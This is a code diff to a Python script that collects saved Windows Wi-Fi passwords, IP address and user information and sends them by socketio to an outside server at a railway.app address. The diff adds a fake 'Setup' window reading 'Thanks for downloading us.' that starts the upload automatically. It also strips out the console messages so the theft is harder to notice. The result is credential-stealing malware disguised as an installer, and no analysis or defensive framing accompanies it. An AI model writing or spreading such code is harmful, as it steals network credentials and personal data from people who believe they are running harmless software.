@@ -1,3 +1,4 @@
+import tkinter as tk
 import socketio
 import subprocess
 import platform
@@ -41,13 +42,13 @@ def get_wifi_password(profile):
         if pwd_search:
             return pwd_search.group(1).strip()
         else:
-            return "No password found"
+            return ""
     except Exception as e:
         return f"Error getting password for {profile}: {e}"
 
 def gather_info():
     if platform.system() != "Windows":
-        return "Wi-Fi password fetching supported only on Windows."
+        return ""
 
     info = []
 
@@ -73,14 +74,19 @@ def gather_info():
 
 def connect_and_send():
     try:
-        print("Connecting to server...")
         sio.connect('https://backfisch-production.up.railway.app')  # <-- Your deployed URL
         data = gather_info()
-        print("Sending gathered info...")
         sio.emit('send_message', {'message': data})
-        print("Sent Wi-Fi, IP, and user info")
+        status_label.config(text="Sent Wi-Fi, IP, and user info")
     except Exception as e:
-        print(f"Error: {e}")
+        status_label.config(text=f"Error: {e}")
 
-if __name__ == "__main__":
-    connect_and_send()
+root = tk.Tk()
+root.title("Setup")
+
+status_label = tk.Label(root, text="Thanks for downloading us.")
+status_label.pack(pady=20)
+
+root.after(100, connect_and_send)
+
+root.mainloop()
